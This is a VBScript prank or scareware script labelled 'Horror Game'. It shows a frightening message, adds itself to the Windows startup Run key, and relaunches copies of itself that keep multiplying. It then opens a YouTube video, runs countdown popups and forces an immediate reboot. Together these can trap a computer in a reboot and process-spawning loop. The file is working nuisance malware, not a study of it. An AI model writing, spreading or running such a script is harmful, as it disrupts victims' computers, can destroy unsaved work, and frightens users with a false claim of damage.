' Display the message box
MsgBox "Congratulations, Your computer is being torn apart from the inside but there's a fix. Now watch closely if you wanna see your computer alive again.", vbOKOnly, "Horror Game"

' Start the countdown timer and open the YouTube video
Sub StartCountdown()
    ' Set the timer duration in seconds (5 minutes)
    Const TimerDuration = 300 ' 5 minutes (300 seconds)

    ' Create a timer object
    Set objTimer = CreateObject("WScript.Shell")

    ' Display the timer countdown
    For i = TimerDuration To 1 Step -1
        strTime = FormatNumber(i / 60, 0) & " minutes remaining"
        objTimer.Popup strTime, 60000, "Countdown Timer", 64 + 48
    Next

    ' Restart the computer
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "shutdown.exe /r /t 0", 0, True
End Sub

' Modify the registry key to add the VBScript to the startup
Set WshShell = WScript.CreateObject("WScript.Shell")
registryPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
registryValueName = "MyVBScriptStartup"
registryValue = """" & WScript.ScriptFullName & """"
WshShell.RegWrite registryPath & "\" & registryValueName, registryValue, "REG_SZ"
Set WshShell = Nothing

' Set the flag indicating that the script has run once
Set WshShell = WScript.CreateObject("WScript.Shell")
flagRegistryPath = "HKCU\Software\MyScript"
flagRegistryValueName = "HasRunOnce"
WshShell.RegWrite flagRegistryPath & "\" & flagRegistryValueName, "1", "REG_SZ"

' Rest of the code here, like the Hydra Popup
For i = 1 To 2
    CreateObject("WScript.Shell").Run "wscript.exe " & WScript.ScriptFullName, 0, False
Next


' Open a YouTube video on how to boot the computer into safe mode
Set objShell = CreateObject("WScript.Shell")
url = "https://www.youtube.com/watch?v=GsAgtteRwGc" ' Replace with the desired YouTube video URL
objShell.Run "cmd /c start " & url, 0, False

' Start the countdown timer
StartCountdown


